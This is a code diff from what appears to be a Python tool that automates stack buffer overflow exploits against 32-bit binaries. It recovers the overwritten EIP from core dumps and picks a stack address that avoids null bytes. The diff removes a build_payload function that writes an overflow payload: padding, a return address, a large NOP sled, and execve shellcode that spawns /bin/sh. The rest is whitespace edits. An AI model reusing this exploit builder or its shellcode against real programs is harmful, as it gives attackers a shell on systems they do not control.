@@ -201,6 +201,7 @@ def overwrite_ra(crash_input: bytes, target_bin: str, target_ra: bytes):
 
     return payload
 
+
 def extract_eip(core_output: str):
 
     eip_value = None
@@ -215,7 +216,7 @@ def extract_eip(core_output: str):
 
     eip_bytes = bytes.fromhex(eip_value)    #convert to hex bytes
     eip_bytes = eip_bytes[::-1] 
-    
+
     return eip_bytes
 
 
@@ -324,21 +325,3 @@ def stack_middle_address(output):
     middle += 4  #all the addresses end in 00 and when this is concatenated in bytes in the payload, it starts with \x00 and terminates the payload. Adding 4 to avoid the \x00 sequence
 
     return middle
-
-
-def build_payload(offset, target):
-
-    middle = stack_middle_address(target_ra(target))
-    shellcode = b'\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80'
-
-    #!!! will change
-    if target == 'vuln':
-        offset += 4 
-    #!!!
-
-    payload = b'A' * offset
-    payload += struct.pack("<I", middle)
-    payload += b'\x90' * 129000
-    payload += shellcode
-
-    open("payload", "wb").write(payload)
